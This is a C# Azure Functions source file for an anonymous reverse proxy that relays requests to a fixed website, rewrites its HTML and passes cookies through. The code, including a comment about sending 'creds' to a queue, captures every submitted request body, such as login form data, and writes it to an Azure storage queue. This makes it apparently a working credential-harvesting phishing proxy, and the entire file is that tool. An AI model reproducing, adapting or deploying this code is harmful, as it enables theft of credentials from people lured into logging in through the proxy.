using System;
using System.Threading.Tasks;
using Microsoft.Azure.WebJobs;
using Microsoft.Azure.WebJobs.Extensions.Http;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Linq;
using System.Net;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Microsoft.Azure.WebJobs.Extensions.Storage;
using System.Runtime.InteropServices;

namespace FunctionProxy
{
    class Config
    {
        // HTML Content Replacement Dictionary
        public Dictionary<string, string> Replacements = new Dictionary<string, string>
        {
            { "/source.html", "/target.html" },
        };
    }

    class Helper
    {
        private ILogger _log;
        private Config _config;
        private bool _debug = System.Convert.ToBoolean(Environment.GetEnvironmentVariable("debug"));
        private string _userAgent = Environment.GetEnvironmentVariable("UserAgent");
        private string _referer = String.Empty;

        public Helper(ILogger log)
        {
            _log = log;
            _config = new Config();
        }

        public Encoding GetCharset(string ContentType)
        {
            string chr = "utf-8";
            if (!string.IsNullOrEmpty(ContentType))
            {
                string enc = ContentType.ToLower();
                foreach (string ctypes in enc.Split(";"))
                    if (ctypes.ToLower().Contains("charset="))
                        chr = ctypes.Trim().Split("=")[1];
            }
            if (_debug)
                _log.LogInformation("Charset: " + chr);
            return Encoding.GetEncoding(chr);

        }

        public MediaTypeWithQualityHeaderValue GetMediaType(string ContentType)
        {
            string ctype = "text/html";
            if (!string.IsNullOrEmpty(ContentType))
            {
                string enc = ContentType.ToLower();
                foreach (string ctypes in enc.Split(";"))
                    if (!ctypes.ToLower().Contains("charset="))
                        ctype = ctypes.ToLower().Trim();
            }
            if (_debug)
                _log.LogInformation("Media Content-Type: " + ctype);
            return new MediaTypeWithQualityHeaderValue(ctype);
        }

        public string GetMediaTypeText(string ContentType)
        {
            string ctype = "text/html";
            if (!string.IsNullOrEmpty(ContentType))
            {
                string enc = ContentType.ToLower();
                foreach (string ctypes in enc.Split(";"))
                    if (!ctypes.ToLower().Contains("charset="))
                        ctype = ctypes.ToLower().Trim();
            }
            if (_debug)
                _log.LogInformation("Text Content-Type: " + ctype);
            return ctype;
        }

        public async Task<HttpResponseMessage> ProcessRequest(HttpRequest req, string url, [Optional]  ICollector<string> msg)
        {
            // Incoming Request to Proxy
            StreamReader readStream = new StreamReader(req.Body, GetCharset(req.ContentType));
            string requestBody = await readStream.ReadToEndAsync();

            if (_debug)
            {
                _log.LogInformation("Incoming Request Query: " + req.QueryString);
                _log.LogInformation("Incoming Request Body: " + requestBody);
                _log.LogInformation("Proxy Requested URL: " + url);
            }

            // Send Creds from req.Query to Queqe
            if (!(msg is null) && System.Convert.ToBoolean(requestBody.Length))
                msg.Add("[" + req.Host.ToString() + "] " + System.Web.HttpUtility.UrlDecode(requestBody));

            // Prepare Request to WebSite
            CookieContainer cookieContainer = new CookieContainer();
            HttpClientHandler handler = new HttpClientHandler();
            handler.CookieContainer = cookieContainer;
            HttpClient client = new HttpClient(handler);
            client.DefaultRequestHeaders.Add("User-Agent", _userAgent);
            client.DefaultRequestHeaders.Accept.Add(GetMediaType(req.ContentType));
            client.DefaultRequestHeaders.CacheControl = new CacheControlHeaderValue { NoCache = true };

            // Add Cookies to Container, Referrer is in Cookies
            foreach (KeyValuePair<string, string> cookie in req.Cookies)
            {
                if (!cookie.Key.Equals("referer"))
                    cookieContainer.Add(new Uri(url), new Cookie(cookie.Key, System.Web.HttpUtility.UrlEncode(cookie.Value)));
                else
                    client.DefaultRequestHeaders.Add("Referer", cookie.Value);
            }

            // Obtain Response from the WebSite
            HttpResponseMessage response;
            switch (req.Method)
            {
                case "POST":
                    response = await client.PostAsync(url, new StringContent(requestBody, GetCharset(req.ContentType), GetMediaTypeText(req.ContentType)));
                    break;
                case "PUT":
                    response = await client.PutAsync(url, new StringContent(requestBody, GetCharset(req.ContentType), GetMediaTypeText(req.ContentType)));
                    break;
                default:
                    response = await client.GetAsync(url);
                    break;
            }
            _referer = response.RequestMessage.RequestUri.ToString();
            //response.EnsureSuccessStatusCode();

            // Building ResultResponse
            //HttpResponseMessage response = new HttpResponseMessage(System.Net.HttpStatusCode.OK);
            HttpResponseMessage resultResponse = new HttpResponseMessage(response.StatusCode);
            string resultContent = await response.Content.ReadAsStringAsync();

            // Replacement
            foreach (var kvp in _config.Replacements)
                resultContent = resultContent.Replace(kvp.Key, kvp.Value.Replace("<addr>", req.Scheme + "://" + req.Host).ToLower());

            resultResponse.Content = new StringContent(resultContent);
            resultResponse.Content.Headers.ContentType = response.Content.Headers.ContentType;

            // Cookies
            IEnumerable<System.Net.Cookie> responseCookies = cookieContainer.GetCookies(new Uri(url)).Cast<System.Net.Cookie>();
            foreach (System.Net.Cookie cookie in responseCookies)
            {
                CookieHeaderValue resultCookie = new CookieHeaderValue(cookie.Name, System.Web.HttpUtility.UrlDecode(cookie.Value));
                if (System.Convert.ToBoolean(cookie.Expires.Ticks))
                    resultCookie.Expires = cookie.Expires.ToUniversalTime();
                resultResponse.Headers.AddCookies(new CookieHeaderValue[] { resultCookie });
            }
            CookieHeaderValue refererCookie = new CookieHeaderValue("referer", System.Web.HttpUtility.UrlDecode(_referer));
            resultResponse.Headers.AddCookies(new CookieHeaderValue[] { refererCookie });

            return resultResponse;
        }
    }

    public static class RunApp
    {
        [FunctionName("RunApp")]
        public static async Task<HttpResponseMessage> Run(
        [HttpTrigger(AuthorizationLevel.Anonymous, "post", Route = null)] HttpRequest req,
        [Queue("queue"), StorageAccount("AzureWebJobsStorage")] ICollector<string> msg, ILogger log)
        {
            var helper = new Helper(log);
            return await helper.ProcessRequest(req, "https://github.com/osysltd/" + req.QueryString, msg);
        }
    }
}